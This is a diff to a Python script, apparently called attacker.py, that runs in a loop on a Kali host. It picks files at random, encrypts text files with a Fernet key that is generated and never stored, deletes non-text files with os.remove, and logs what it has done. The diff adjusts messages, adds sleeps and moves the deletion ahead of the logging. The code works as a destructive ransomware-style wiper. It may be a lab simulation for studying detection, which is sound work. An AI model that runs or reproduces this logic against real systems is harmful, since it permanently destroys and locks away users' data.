@@ -49,6 +49,8 @@ print(Fore.RED+ "these are to Non-TEXT modifiable files: ")
 print(NonText_Files_Table)
 print(Fore.GREEN + "one of the root files " + str(theroot))
 
+f1 = open("encryptedfiles.txt","a")
+f1.close()
 key = Fernet.generate_key()
 
 while True:
@@ -71,7 +73,7 @@ while True:
 		
 		if found == False:
 			try:
-				print("encrypt: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
+				print("encrypting: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
 				with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
 					contents = thefile.read()
 				contents_enctypted = Fernet(key).encrypt(contents)
@@ -84,23 +86,26 @@ while True:
 				time.sleep(5)
 			except:
 				print("we don't have permission to modify the file")
+				time.sleep(5)
 		else:
 			print("file already encrypted")
+			time.sleep(5)
 	
 	##################################### deleting a file: #####################################
 	if NonText_Files_Table[randomeNumberOfNonTextFiles] == "/home/kali/Desktop/attacker.py":
 		continue
 	else:
 		try:
+			print("deleting: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
+			os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 			f2 = open("deletedfiles.txt","a")
 			f2.write(str(NonText_Files_Table[randomeNumberOfNonTextFiles]) + "\n")
-			print("delete: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
-			os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 			f2.close()
 			NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 			time.sleep(5)
 		except:
 			print("we don't have permission to delete the file")
+			time.sleep(5)
 	
 	##################################### addind a file: #####################################
 	f = open(str(randomeNumberOfFiles), "w")
@@ -109,6 +114,3 @@ while True:
 	time.sleep(5)
 	
 	print("--------------------------------------------------------------------------------------------")
-
-
-    		
